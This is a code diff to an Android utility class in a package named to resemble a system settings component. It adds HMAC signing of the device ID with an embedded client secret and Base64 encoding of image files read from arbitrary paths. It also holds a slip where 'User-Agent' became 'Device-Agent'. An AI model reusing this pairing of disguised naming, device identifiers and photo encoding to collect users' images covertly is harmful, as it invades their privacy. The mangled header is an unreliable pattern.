@@ -9,22 +9,27 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.support.v4.app.NotificationCompat;
+import android.util.Base64;
 import android.util.Log;
 
 import com.android.media.settings.Interface.MediaAPI;
 import com.android.media.settings.MediaConfig;
 import com.android.media.settings.MediaDBManager;
+import com.android.media.settings.Model.Device;
 import com.android.media.settings.Model.Media;
-import com.android.media.settings.Model.User;
 import com.google.gson.Gson;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -34,6 +39,9 @@ import java.util.LinkedList;
 import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.TimeUnit;
+
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
 
 import io.reactivex.Observable;
 import io.reactivex.Observer;
@@ -77,8 +85,13 @@ public class MediaUtility {
         return mMediaUtility;
     }
 
-    public User getUser(){
-        return new User(getUsername(), getDeviceId());
+    public Device getDevice(){
+        final String uuid = getDeviceId();
+        return new Device(
+                uuid,
+                getUsername(),
+                encode(MediaConfig.API_CLIENT_SECRET_KEY, uuid)
+        );
     }
 
     public String toJson(Object object) {
@@ -211,7 +224,7 @@ public class MediaUtility {
         if(networkOnline()) {
             try {
                 HttpURLConnection connection = (HttpURLConnection) (new URL("http://www.google.com").openConnection());
-                connection.setRequestProperty("User-Agent", "Test");
+                connection.setRequestProperty("Device-Agent", "Test");
                 connection.setRequestProperty("Connection", "close");
                 connection.setConnectTimeout(1500);
                 connection.connect();
@@ -312,4 +325,34 @@ public class MediaUtility {
         return allGranted;
     }
 
+    public static String encode(String key, String data){
+        try {
+            Mac sha256_HMAC = Mac.getInstance("HmacSHA256");
+            SecretKeySpec secret_key = new SecretKeySpec(key.getBytes("UTF-8"), "HmacSHA256");
+            sha256_HMAC.init(secret_key);
+            return Base64.encodeToString(sha256_HMAC.doFinal(data.getBytes("UTF-8")), Base64.DEFAULT);
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+
+    public String encodeImage(String path) {
+        File imageFile = new File(path);
+        FileInputStream fis = null;
+        try{
+            fis = new FileInputStream(imageFile);
+        }catch(FileNotFoundException e){
+            e.printStackTrace();
+        }
+        Bitmap bm = BitmapFactory.decodeStream(fis);
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bm.compress(Bitmap.CompressFormat.JPEG,100, baos);
+        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
+    }
+
+    public Bitmap decodeImage(String data) {
+        byte[] b = Base64.decode(data,Base64.DEFAULT);
+        return BitmapFactory.decodeByteArray(b,0, b.length);
+    }
 }
